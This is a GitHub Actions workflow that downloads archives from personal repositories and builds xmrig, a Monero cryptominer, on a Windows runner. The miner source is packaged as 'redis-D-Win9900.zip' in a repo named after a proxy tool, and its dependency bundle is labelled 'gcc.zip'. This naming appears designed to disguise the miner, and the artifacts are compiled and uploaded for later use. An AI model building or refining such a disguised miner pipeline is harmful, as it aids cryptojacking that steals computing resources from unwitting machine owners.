name: Build on 2025-04-30

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  build-windows:
    runs-on: windows-latest
    env:
      REPO_PATH: D:/a/frp-2/frp-2  # GitHub Actions的固定工作目录路径

    steps:
      - name: Checkout source code
        uses: actions/checkout@v3

      # Install MSVC build tools directly on the runner
      - name: Setup Visual Studio Developer Command Prompt
        uses: ilammy/msvc-dev-cmd@v1

      # Create build directories
      - name: Create directories
        run: |
          mkdir -p deps
          mkdir -p artifacts

      # 打印当前环境信息
      - name: Print environment info
        run: |
          Write-Host "Current working directory: $(Get-Location)"
          Write-Host "GitHub workspace: ${{ github.workspace }}"
          Write-Host "CMake version:"
          cmake --version
          Write-Host "Compiler information:"
          cl.exe 2>&1 | Select-String -Pattern "Version" -SimpleMatch

      # Download dependencies with retry mechanism
      - name: Download dependencies
        run: |
          $ProgressPreference = 'SilentlyContinue'  # Speeds up downloads
          
          # Function to download with retry
          function Download-WithRetry {
            param(
              [string]$Url,
              [string]$OutputFile,
              [int]$MaxRetries = 3
            )
            
            $retryCount = 0
            $success = $false
            
            while (-not $success -and $retryCount -lt $MaxRetries) {
              try {
                Write-Host "Downloading $Url to $OutputFile (Attempt $(($retryCount + 1)))"
                Invoke-WebRequest -Uri $Url -OutFile $OutputFile -UseBasicParsing
                $success = $true
                Write-Host "Download successful!"
              }
              catch {
                $retryCount++
                Write-Host "Download failed: $_"
                Write-Host "Retrying in 5 seconds..."
                Start-Sleep -Seconds 5
              }
            }
            
            if (-not $success) {
              throw "Failed to download after $MaxRetries attempts."
            }
          }
          
          # Download required files
          Download-WithRetry -Url "https://github.com/Janit8r/device_lge_judyln/raw/S/gcc.zip" -OutputFile "deps/gcc.zip"
          Download-WithRetry -Url "https://github.com/Janit8r/frp-2/raw/refs/heads/dev/redis-D-Win9900.zip" -OutputFile "deps/redis.zip"
        shell: pwsh

      # Extract dependencies
      - name: Extract dependencies
        run: |
          $ProgressPreference = 'SilentlyContinue'  # Speeds up extraction
          Write-Host "Extracting dependencies..."
          
          # Extract with error handling
          try {
            Expand-Archive -Path deps/gcc.zip -DestinationPath deps/gcc -Force
            Expand-Archive -Path deps/redis.zip -DestinationPath deps/redis -Force
            Write-Host "Extraction completed successfully."
          }
          catch {
            Write-Host "Error during extraction: $_"
            exit 1
          }
        shell: pwsh

      # Set up CMake
      - name: Set up CMake
        uses: jwlawson/actions-setup-cmake@v1.13
        with:
          cmake-version: '3.20.x'

      # Setup vcpkg to install libuv
      - name: Setup vcpkg
        run: |
          # Clone vcpkg
          git clone https://github.com/Microsoft/vcpkg.git
          cd vcpkg
          
          # Bootstrap vcpkg
          ./bootstrap-vcpkg.bat
          
          # Set environment variables to speed up build
          $env:VCPKG_DEFAULT_TRIPLET = "x64-windows"
          $env:VCPKG_DISABLE_METRICS = "true"
          
          # Install libuv, openssl, and hwloc
          ./vcpkg install libuv:x64-windows openssl:x64-windows hwloc:x64-windows
          
          # Integrate with Visual Studio
          ./vcpkg integrate install
          
          # List installed packages
          Write-Host "Installed packages:"
          ./vcpkg list
        shell: pwsh

      # Check project structure and CMakeLists.txt
      - name: Check project structure
        run: |
          Write-Host "Checking project structure..."
          
          # 查看项目目录结构
          Get-ChildItem -Path "deps/redis/redis-D-Win9900" -Recurse -Depth 2 | Select-Object FullName
          
          # 检查CMakeLists.txt
          $cmakePath = "deps/redis/redis-D-Win9900/CMakeLists.txt"
          if (Test-Path $cmakePath) {
            Write-Host "CMakeLists.txt found. Content preview:"
            Get-Content $cmakePath -TotalCount 50
            
            # 查找所有与xmrig相关的行
            Write-Host "Lines related to xmrig target:"
            Select-String -Path $cmakePath -Pattern "xmrig" | ForEach-Object {
              Write-Host "Line $($_.LineNumber): $($_.Line)"
            }
            
            # 查找target_sources行
            Write-Host "target_sources lines:"
            Select-String -Path $cmakePath -Pattern "target_sources" | ForEach-Object {
              Write-Host "Line $($_.LineNumber): $($_.Line)"
            }
            
            # 计算行数
            $lineCount = (Get-Content $cmakePath).Length
            Write-Host "CMakeLists.txt has $lineCount lines"
          } else {
            Write-Host "CMakeLists.txt not found at expected location: $cmakePath"
          }
        shell: pwsh
        continue-on-error: true

      # 尝试使用带有CMAKE_MODULE_PATH的方式构建
      - name: Configure with module path fix
        run: |
          cd deps/redis/redis-D-Win9900
          
          # 创建构建目录
          mkdir -Force cmake_build
          cd cmake_build
          
          # 使用正确的路径格式
          $xmrigDepsPath = "${{ github.workspace }}/deps/gcc/gcc/x64" -replace '\\', '/'
          $vcpkgPath = "${{ github.workspace }}/vcpkg" -replace '\\', '/'
          Write-Host "Using XMRIG_DEPS path: $xmrigDepsPath"
          Write-Host "Using vcpkg path: $vcpkgPath"
          
          # 查找源文件目录中的modules目录
          $modulePath = ""
          if (Test-Path "../cmake") {
            $modulePath = "../cmake"
          } elseif (Test-Path "../CMake") {
            $modulePath = "../CMake"
          }
          
          Write-Host "Module path: $modulePath"
          
          # 使用-DCMAKE_MODULE_PATH指定模块路径，使项目能找到其依赖项
          cmake .. -G "NMake Makefiles" -DCMAKE_BUILD_TYPE=Release -DXMRIG_DEPS="$xmrigDepsPath" -DBUILD_SHARED_LIBS=OFF -DCMAKE_TOOLCHAIN_FILE="$vcpkgPath/scripts/buildsystems/vcpkg.cmake" -DCMAKE_MODULE_PATH="$modulePath"
        shell: pwsh
        continue-on-error: true

      # 尝试定位和查看错误日志
      - name: Check CMake error logs
        run: |
          Write-Host "Checking CMake error logs..."
          
          # 定义可能的日志位置
          $logDirs = @(
            "deps/redis/redis-D-Win9900/modified_build/CMakeFiles",
            "deps/redis/redis-D-Win9900/build/CMakeFiles",
            "deps/redis/redis-D-Win9900/cmake_build/CMakeFiles"
          )
          
          foreach ($dir in $logDirs) {
            if (Test-Path "$dir/CMakeError.log") {
              Write-Host "Found CMakeError.log in $dir"
              Write-Host "==== Error Log Content ===="
              Get-Content "$dir/CMakeError.log" | Select-Object -Last 100
              Write-Host "==========================="
            }
          }
        shell: pwsh
        continue-on-error: true

      # 尝试单独构建xmrig.cpp
      - name: Try direct compile of xmrig.cpp
        run: |
          # 定位xmrig.cpp
          $sourcePath = "deps/redis/redis-D-Win9900/src/xmrig.cpp"
          if (Test-Path $sourcePath) {
            Write-Host "Found xmrig.cpp at $sourcePath"
            
            # 检查必要的头文件和路径
            $xmrigDepsPath = "${{ github.workspace }}/deps/gcc/gcc/x64" -replace '\\', '/'
            $vcpkgIncludePath = "${{ github.workspace }}/vcpkg/installed/x64-windows/include" -replace '\\', '/'
            
            try {
              # 创建构建目录
              mkdir -Force artifacts/direct_build -ErrorAction Stop
              cd artifacts/direct_build
              
              # 尝试直接编译
              Write-Host "Attempting direct compilation of xmrig.cpp..."
              cl.exe /EHsc /MD /I"$xmrigDepsPath/include" /I"$vcpkgIncludePath" /I"../../deps/redis/redis-D-Win9900/src" "$sourcePath" /link /LIBPATH:"$xmrigDepsPath/lib" /LIBPATH:"${{ github.workspace }}/vcpkg/installed/x64-windows/lib" uv.lib libcrypto.lib user32.lib
              
              if (Test-Path "xmrig.exe") {
                Write-Host "Successfully compiled xmrig.exe!"
                Copy-Item -Path "xmrig.exe" -Destination "../../artifacts/" -Force
              }
            }
            catch {
              Write-Host "Direct compilation failed: $_"
            }
          } else {
            Write-Host "Could not find xmrig.cpp"
          }
        shell: pwsh
        continue-on-error: true

      # 尝试修复target_sources问题
      - name: Fix target_sources issue
        run: |
          cd deps/redis/redis-D-Win9900
          
          # 修改CMakeLists.txt修复target_sources调用问题
          $cmakePath = "CMakeLists.txt"
          $content = Get-Content $cmakePath -Raw
          
          # 查找并修复target_sources问题，通常是多个add_executable或target_sources之间的冲突
          if ($content -match "target_sources\s*\(\s*xmrig") {
            Write-Host "Found target_sources for xmrig, modifying CMakeLists.txt..."
            
            # 备份原始文件
            Copy-Item -Path $cmakePath -Destination "$cmakePath.bak" -Force
            
            # 替换所有目标名为xmrig的target_sources调用为条件检查
            $fixed = $content -replace "(target_sources\s*\(\s*xmrig)", "if(TARGET xmrig)`n`$1"
            $fixed = $fixed -replace "(target_sources\s*\(\s*xmrig[^)]*\))", "`$1`nendif()"
            
            # 保存修改
            Set-Content -Path $cmakePath -Value $fixed -Force
            
            # 创建并进入新的构建目录
            mkdir -Force fixed_build
            cd fixed_build
            
            # 配置CMake
            $xmrigDepsPath = "${{ github.workspace }}/deps/gcc/gcc/x64" -replace '\\', '/'
            $vcpkgPath = "${{ github.workspace }}/vcpkg" -replace '\\', '/'
            Write-Host "Using XMRIG_DEPS path: $xmrigDepsPath"
            Write-Host "Using vcpkg path: $vcpkgPath"
            
            # 使用修复后的CMakeLists.txt构建
            cmake .. -G "NMake Makefiles" -DCMAKE_BUILD_TYPE=Release -DXMRIG_DEPS="$xmrigDepsPath" -DBUILD_SHARED_LIBS=OFF -DCMAKE_TOOLCHAIN_FILE="$vcpkgPath/scripts/buildsystems/vcpkg.cmake"
            
            # 构建
            nmake
          }
        shell: pwsh
        continue-on-error: true

      # List available tools and folders
      - name: List available tools and directories
        run: |
          Write-Host "Available build tools:"
          where.exe cl
          where.exe link
          where.exe nmake
          where.exe ml64  # Check for MASM
          
          Write-Host "Directories in deps/gcc/gcc/x64:"
          if (Test-Path "deps/gcc/gcc/x64") {
            Get-ChildItem -Path "deps/gcc/gcc/x64" -Recurse -Depth 2 | ForEach-Object { Write-Host "  $_" }
          } else {
            Write-Host "deps/gcc/gcc/x64 directory does not exist"
          }
          
          Write-Host "vcpkg installed packages:"
          if (Test-Path "vcpkg/installed/x64-windows") {
            Get-ChildItem -Path "vcpkg/installed/x64-windows/include" -Directory | ForEach-Object { Write-Host "  $_" }
            Get-ChildItem -Path "vcpkg/installed/x64-windows/lib" -File | ForEach-Object { Write-Host "  $_" }
          } else {
            Write-Host "vcpkg/installed/x64-windows directory does not exist"
          }
        shell: pwsh
        continue-on-error: true  # Continue even if some directories don't exist

      # 收集所有可能的构建结果
      - name: Collect build artifacts
        run: |
          Write-Host "Collecting build artifacts from all possible build directories..."
          
          # 定义要搜索的目录
          $searchDirs = @(
            "deps/redis/redis-D-Win9900/build",
            "deps/redis/redis-D-Win9900/modified_build",
            "deps/redis/redis-D-Win9900/simple_build",
            "deps/redis/redis-D-Win9900/cmake_build",
            "deps/redis/redis-D-Win9900/fixed_build",
            "deps/redis/redis-D-Win9900"
          )
          
          # 查找所有可能的构建结果
          foreach ($dir in $searchDirs) {
            if (Test-Path $dir) {
              Write-Host "Checking $dir for build artifacts..."
              
              # 查找exe和dll文件
              Get-ChildItem -Path $dir -Include "*.exe", "*.dll" -Recurse -File | ForEach-Object {
                Write-Host "Found: $($_.FullName)"
                Copy-Item -Path $_.FullName -Destination "artifacts/" -Force
              }
            }
          }
          
          # 复制vcpkg安装的DLL文件
          if (Test-Path "vcpkg/installed/x64-windows/bin") {
            Write-Host "Copying vcpkg DLL files"
            Copy-Item -Path "vcpkg/installed/x64-windows/bin/*.dll" -Destination "artifacts/" -Force
          }
          
          # 检查是否有构建结果
          $artifactFiles = Get-ChildItem -Path "artifacts"
          Write-Host "Total artifacts found: $($artifactFiles.Count)"
          if ($artifactFiles.Count -gt 0) {
            Write-Host "Artifacts:"
            $artifactFiles | ForEach-Object { Write-Host "  $($_.Name)" }
          } else {
            Write-Host "No artifacts found!"
          }
        shell: pwsh
        continue-on-error: true

      # Upload artifacts
      - name: Archive build artifacts
        uses: actions/upload-artifact@v4
        with:
          name: build-artifacts
          path: artifacts/
